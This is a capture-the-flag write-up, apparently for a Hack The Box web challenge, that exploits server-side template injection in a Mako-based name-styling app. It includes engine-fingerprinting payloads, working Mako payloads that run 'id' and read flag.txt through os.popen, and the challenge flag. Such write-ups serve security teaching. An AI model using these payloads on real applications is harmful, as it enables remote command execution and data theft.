
> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

&nbsp;

![1](https://github.com/user-attachments/assets/5064c874-6b90-485d-abe7-c820170d8855)

As we can see, the application modifies the name with different fonts.

## SSTI

Let's provide the following input:

```
${9+9}
```

![2](https://github.com/user-attachments/assets/a00100bc-171c-4571-ae71-49d0236fe7a5)

A valid response. This means that the vulnerability is SSTI.

## Identifying the Template Engine

Before we move on to crafting our payload, we need to first identify the template engine being used by the server. 
There are two methods that we can follow.

### Using payloads

This graph from PayloadsAllTheThings gives us the steps to follow in order to identify the engine:

![image](https://github.com/user-attachments/assets/d724e4bc-b269-4b3d-91bb-ff85589dc98c)

Let's begin with the first payload.

```
${7*7}
```

![image](https://github.com/user-attachments/assets/72812659-f60a-4a54-a1c8-ef852881d3d7)

Since the payload returned a valid response, we move to the next payload:

```
a{*comment*}b
```

![image](https://github.com/user-attachments/assets/eca442fd-99d9-4c6f-9862-8d33162b6224)

Not a valid response, let's move to the next one.

```
${"z".join("ab")}
```

![image](https://github.com/user-attachments/assets/4f33f9f4-5592-4f52-ae43-9b6012c6abe7)

This tells us that the server is running a [Mako template engine](https://www.makotemplates.org/).

### Using code review

Alternatively, we can simply just read the code to identify the engine.
Let's start with the config file.

![image](https://github.com/user-attachments/assets/9c41f8c7-7a5d-439b-868e-84262d658fd6)

Looking at the `supervisord.conf` file, we can see that it runs the `/app/run.py` file.

![image](https://github.com/user-attachments/assets/420d32e0-926e-4c2a-a4ac-4878ac43c119)

Then `run.py` imports `app` from `application.main` and runs it on port 1337.

![image](https://github.com/user-attachments/assets/d10a10ad-aad3-4768-8cc1-5b15e72aadb8)

As we can see the `app` object is using Mako template.
The `web` is also being imported from `application.blueprints.routes`.

![image](https://github.com/user-attachments/assets/ad5c9e1b-9c1e-43fe-b406-e98f03440b03)

This script takes the argument passed to the `text` parameter and sends it to the `spookify()` function which is imported from `application.util`.

![image](https://github.com/user-attachments/assets/29efe56f-e608-4d5b-9fc4-2b1fe84ccf8f)

The `change_font()` function simply converts user input into a list and replaces it with it's mapped character from a different font.

### Payload

Since there is no input validation being perfomred, we can run arbitrary commands.

Let's access the `os` module and find our user.

```
${self.module.cache.util.os.popen('id').read()}
```

![3](https://github.com/user-attachments/assets/6ccc5105-a53e-4235-8600-1d9a771e6bf9)

We can now read the `flag.txt` file using a similar payload:

```
${self.module.cache.util.os.popen('cat ../flag.txt').read()}
```

![4](https://github.com/user-attachments/assets/44c793c6-52be-46eb-b976-b97055e59a32)

## Flag

```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```
